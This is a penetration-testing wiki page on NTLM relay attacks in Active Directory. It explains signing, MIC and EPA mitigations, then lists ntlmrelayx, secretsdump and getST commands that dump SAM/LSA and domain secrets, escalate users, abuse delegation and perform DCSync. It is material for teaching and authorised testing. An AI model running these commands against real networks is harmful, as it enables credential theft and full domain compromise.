---
description: MITRE ATT&CK™ Sub-technique T1557.001
---

# Relay

## Theory

After successfully [forcing a victim to authenticate](../mitm-and-coerced-authentications/) with LM or NTLM to an attacker's server, the attacker can try to relay that authentication to targets of his choosing. Depending on the mitigations in place, he will be able to move laterally and escalate privileges within an Active Directory domain.

The NTLM authentication messages are embedded in the packets of application protocols such as SMB, HTTP, MSSQL, SMTP, IMAP. The LM and NTLM authentication protocols are "application protocol-independent". It means one can relay LM or NTLM authentication messages over a certain protocol, say HTTP, over another, say SMB. That is called **cross-protocols LM/NTLM relay**. It also means the relays and attacks possible depend on the application protocol the authentication messages are embedded in.

The chart below sums up the expected behavior of cross-protocols relay attacks depending on the mitigations in place ([original here](https://beta.hackndo.com/ntlm-relay/)). All the tests and results listed in the chart were made using [Impacket](https://github.com/SecureAuthCorp/impacket/)'s [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python).

![](../../../.assets/ntlm\_relau\_mitigation\_chart.png)

The following mindmap sums up the overall attack paths of NTLM relay. [Gabriel Prudhomme](https://twitter.com/vendetce) explains how to read it here: [BHIS | Coercions and Relays – The First Cred is the Deepest](https://youtu.be/b0lLxLJKaRs?t=480) (at 08:00).

![](<../../../.gitbook/assets/NTLM relay.png>)

### Session signing

Session signing is a powerful but limited mitigation against NTLM relay that only SMB and LDAP can use.

* **SMB signing** works in a "least requirements" way. If neither the client or the server require signing, the session will not be signed (because of performance issues)
* **LDAP signing** works in a "most requirements" way. If both the client and the server support signing, then they will sign the session

For this mitigation to protect against NTLM relay, it has to be enabled on the target server side. Session signing protects the session's integrity, not the authentication's integrity. If session signing fails on the relayed victim side, the session `victim <-> attacker` will be killed AFTER the authentication, hence allowing an attacker to relay that authentication and get a valid session `attacker <-> target` (if the target is not requiring signing).

Since the session signing is negotiated during the NTLM authentication, why couldn't attackers tamper with the messages and unset the signing negotiation flags? Because there is a protection called [MIC](relay.md#mic-message-integrity-code) that prevents this.

{% hint style="info" %}
There is a strange behavior when doing **cross-protocols relay** (like relaying an SMB auth to an LDAP auth). When attackers try to relay NTLM blobs including signing negotiation flags to a protocol not supporting session signing (like LDAPS), the target server usually glitches and kills the authentication negotiation.

Attackers that want to avoid glitches like this need to operate an **cross-protocols unsigning relay** where they relay the NTLM blobs and remove the signing negotiation flags.
{% endhint %}

### MIC (Message Integrity Code)

MIC (Message Integrity Code) is an optional mitigation that garantess the NTLM messages integrity. MIC prevents attackers from tampering with NTLM messages when relaying them (i.e. cross-protocols unsigning relays). With this mitigation, attackers can't remove the session signing negotiation flags. Unlike session signing, MIC protects the authentication.

On a side note, NTLMv2 responses are computed against multiples values including

* the user's NT hash
* the server Challenge
* the `AvPairs`, a byte array containing the `msAvFlags` flag, which is used to enable the MIC

On the other hand, NTLMv1 responses do not include the `AvPairs` in their calculation, leaving the MIC unsupported for this version of NTLM.

In conclusion, session signing is protected by the MIC, which is enabled with the `msAvFlags`, which is protected by the NTLMv2 response, which can not be modified when not knowing the user's NT hash.

(Un)fortunately, there are vulnerabilities that exist that allow attackers to operate cross-protocols unsigning relays on unpatched targets.

* Drop the MIC (CVE-2019-1040)
* Drop the MIC 2 (CVE-2019-1166)
* Stealing the session key (CVE-2019-1019)

{% hint style="warning" %}
As of november 2020, MIC was optional, but [unofficial channels](https://twitter.com/decoder\_it/status/1347976999567032321) suggest it might've become mandatory.
{% endhint %}

{% hint style="info" %}
Windows Server 2019 ISOs seem to be patched against (at least) CVE-2019-1040.
{% endhint %}

{% hint style="danger" %}
Reminder: if NTLMv1 is accepted, NTLM could be relayed and modified and the MIC dropped :microphone:&#x20;
{% endhint %}

### EPA (Extended Protection for Auth.) <a href="#epa-extended-protection-for-authentication" id="epa-extended-protection-for-authentication"></a>

In short, EPA (Extended Protection for Authentication) can use one or both of the following two mitigations to provide mitigation against NTLM relay for protocols that don't support session signing such HTTPS and LDAPS:

* A Channel Binding Token (CBT) when there is a TLS channel to bind to (HTTPS, LDAPS)
* A Service Binding information in the form of a Service Principal Name (SPN), usually when there is no TLS channel to bind to (HTTP)

{% hint style="info" %}
For more details on how NTLM works, testers can read [the MS-NLMP doc](https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-NLMP/\[MS-NLMP].pdf).&#x20;
{% endhint %}

## Practice

### Detection

From UNIX-like systems, [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python) and [LdapRelayScan](https://github.com/zyn3rgy/LdapRelayScan) (Python) can be used to identify [signing](relay.md#session-signing) and [channel binding](relay.md#epa-extended-protection-for-authentication) requirements for SMB, LDAP and LDAPS.

```bash
crackmapexec smb $target
LdapRelayScan.py -u "user" -p "password" -dc-ip "DC_IP_address" -method BOTH
```

### Abuse

[ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python), [MultiRelay](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py) (Python) and [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) (Powershell) are great tools for relaying NTLM authentications. Those tools setup relay clients and relay servers waiting for incoming authentications. Once the servers are up and ready, the tester can initiate a [forced authentication attack](../mitm-and-coerced-authentications/).

{% hint style="warning" %}
When combining NTLM relay with Responder for [name poisoning](../mitm-and-coerced-authentications/#llmnr-nbt-ns-mdns-name-poisoning), testers need to make sure that Responder's servers are deactivated, otherwise they will interfere with ntlmrelayx ones.

```
sed -i 's/SMB = On/SMB = Off/g' /PATH/TO/Responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/g' /PATH/TO/Responder/Responder.conf
```
{% endhint %}

Below are different use-cases of ntlmrelayx. The last "**+**" tab lists other interesting features that make this tool a must-have when attacking AD domains. It's important to know that many of the use-cases below can be combined.

{% tabs %}
{% tab title="Cred dump" %}
The following command will try to relay the authentication over SMB and attempt a remote [dump of the SAM & LSA secrets](../credentials/dumping/sam-and-lsa-secrets.md) from the target if the relayed victim has the right privileges.

At the time of this article update (12th Feb. 2022), [a pull request](https://github.com/SecureAuthCorp/impacket/pull/1253) adding LSA dump to the existing SAM dump is pending.

```bash
ntlmrelayx.py -t smb://$TARGET
```
{% endtab %}

{% tab title="SOCKS" %}
The following command will try to relay the authentication and open [SOCKS proxies](../../../systems-and-services/pivoting/socks-proxy.md).

```bash
ntlmrelayx.py -tf targets.txt -socks
```

The attacker will be able to use some tools along with proxychains to operate attack through the relayed authenticated session. In this case, secretsdump can be used to dump hashes from the remote target's [SAM and LSA secrets](../credentials/dumping/sam-and-lsa-secrets.md).

```bash
proxychains secretsdump.py -no-pass $DOMAIN/$USER@$TARGET
```
{% endtab %}

{% tab title="Enum" %}
The following command will run an enumeration of the Active Directory domain through the relayed authenticated session. The operation will create multiple `.html`, `.json` and `.grep` files. It will also gather lots of information regarding the domain users and groups, the computers, [ADCS](../ad-cs/), etc.

```bash
ntlmrelayx -t "ldap://domaincontroller" --dump-adcs --dump-laps --dump-gmsa
```
{% endtab %}

{% tab title="Creation" %}
The following command will abuse the default value (i.e. 10) of [`ms-DS-MachineAccountQuota`](../domain-settings/machineaccountquota.md) to create a domain machine account. The tester will then be able to use it for AD operations.

```bash
ntlmrelayx.py -t ldaps://$DC_TARGET --add-computer SHUTDOWN
```

Another way of creating an account is to relay a user that has that right. When the domain user has enough privileges, that account will be promoted to a privileged group.

```bash
ntlmrelayx.py -t ldaps://$DC_TARGET
```

{% hint style="info" %}
In most cases, the `--remove-mic` option will be needed when relaying to LDAP(S) because of the [MIC protection](relay.md#mic-message-integrity-code).
{% endhint %}

{% hint style="info" %}
Using LDAPS for that operation is not mandatory since Active Directory LDAP implements StartTLS. This is implemented in Impacket since April 30th 2022 ([PR #1305](https://github.com/SecureAuthCorp/impacket/pull/1305)).

```bash
ntlmrelayx.py -t ldap://$DC_TARGET --add-computer SHUTDOWN
```
{% endhint %}
{% endtab %}

{% tab title="Promotion" %}
The following command will try to relay the authentication over LDAPS and escalate the privileges of a domain user by adding it to a privileged group or doing some [ACE abuse](../dacl/) (`--escalate-user`) if the relayed account has sufficient privileges.

```bash
ntlmrelayx.py -t ldaps://$DOMAIN_CONTROLLER --escalate-user SHUTDOWN
```

{% hint style="info" %}
This technique is usually combined with a [PushSubscription abuse (a.k.a. PrivExchange)](../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to force an Exchange server to initiate an authentication, relay it to a domain controller and abuse the default high privileges of Exchange servers in AD domains (`WriteDACL` over domain object, see [Abusing ACEs](../dacl/)) to escalate a domain user privileges (`--escalate-user`).
{% endhint %}
{% endtab %}

{% tab title="Delegation" %}
The following command will [abuse Resource Based Kerberos Constrained Delegations (RBCD)](../kerberos/delegations/rbcd.md) to gain admin access to the relayed machine. The `--escalate-user` option must be supplied with a controlled machine account name. If no machine account is controlled, the `--add-computer` option can be supplied instead like the "Account creation" tab before, and by targeting LDAPS instead of LDAP.

```bash
ntlmrelayx.py -t ldaps://$DC_TARGET --escalate-user SHUTDOWN --delegate-access
```

If successful, the attacker will then be able to get a service ticket with the created domain machine account for the relayed victim and impersonate any account (e.g. the domain admin) on it.

```bash
getST.py -spn host/$RELAYED_VICTIM '$DOMAIN/$NEW_MACHINE_ACCOUNT$:$PASSWORD' -dc-ip $DOMAIN_CONTROLLER_IP -impersonate $USER_TO_IMPERSONATE
export KRB5CCNAME=$USER_TO_IMPERSONATE.ccache
secretsdump.py -k $RELAYED_VICTIM
```
{% endtab %}

{% tab title="DCSync" %}
A [DCSync](../credentials/dumping/dcsync.md) can also be operated with a relayed NTLM authentication, but only if the target domain controller is vulnerable to [Zerologon](../netlogon/zerologon.md) since the DRSUAPI always requires signing.

```bash
# target vulnerable to Zerologon, dump DC's secrets only
ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER'

# target vulnerable to Zerologon, dump Domain's secrets
ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER' -auth-smb 'DOMAIN'/'LOW_PRIV_USER':'PASSWORD'
```
{% endtab %}
{% endtabs %}

### Tips & tricks :bulb:

The ntlmrelayx tool offers features making it a very valuable asset when pentesting an Active Directory domain:

* It can work with mitm6 (for [DHCPv6 + DNS poisoning](../mitm-and-coerced-authentications/#ipv6-dns-poisoning)) by enabling IPv6 support with the `-6` option (IPv6 support is not required since most hosts will send IPv4 but using this option is recommended since it will allow relay servers to work with IPv4 and IPv6)
* It supports SMB2. It can be enabled with the `-smb2support` option
* It implements **CVE-2019-1040** with the `--remove-mic` option, usually needed when attempting "cross-protocols unsigning relays" (e.g. **SMB to SMB-with-required-signing, or SMB to LDAP/S).** This option can also be used when NTLMv1 is allowed (NTLMv1 doesn't support MIC).
* it implements **CVE-2019-1019** with the `-remove-target` and `-machine-account` arguments
* It has the ability to attack multiple targets with the `-tf` option instead of `-t`, and the `-w` option can be set to watch the target file for changes and update target list automatically
* the target can be specified with a target protocol like `ldap://target` but the "all" keyword can be used (`all://target`). If the protocol isn't specified, it defaults to smb.
* It has the ability to relay connections for specific target users to be defined in the targets file
* It has the ability to relay a single connection (SMB only for now) to multiple targets, see below

{% hint style="info" %}
Thanks to [the "multi-relay" feature](https://github.com/SecureAuthCorp/impacket/pull/767), another attacker machine/interface can be added to the targets to combine ntlmrelayx with Responder servers. The attackers will be able capture an NTLM response with a custom challenge on an interface/machine, while relaying on another.
{% endhint %}

![](../../../.gitbook/assets/capture\_and\_relay.png)

{% hint style="info" %}
The targets file used with the `-tf` option can contain the following

```bash
# User filter for SMB only (for now)
smb://DOMAIN\User@192.168.1.101
smb://User@192.168.1.101

# Custom ports and paths can be specified
smb://target:port
http://target:port/somepath

# Domain name can be used instead of the IP address
ldaps://someserver.domain.lan
someserver.domain.lan
```
{% endhint %}

{% hint style="info" %}
[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python) has the ability to generate the list of possible targets for relay to SMB (hosts with SMB signing not required).

```bash
crackmapexec smb --gen-relay-list targets.txt $SUBNET
```
{% endhint %}

## References

{% embed url="https://docs.microsoft.com/en-us/archive/blogs/josebda/the-basics-of-smb-signing-covering-both-smb1-and-smb2" %}

{% embed url="https://en.hackndo.com/ntlm-relay/" %}

{% embed url="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html" %}

{% embed url="https://hunter2.gitbook.io/darthsidious/execution/responder-with-ntlm-relay-and-empire" %}

{% embed url="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" %}

{% embed url="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/" %}

{% embed url="http://davenport.sourceforge.net/ntlm.html" %}

{% embed url="https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022" %}
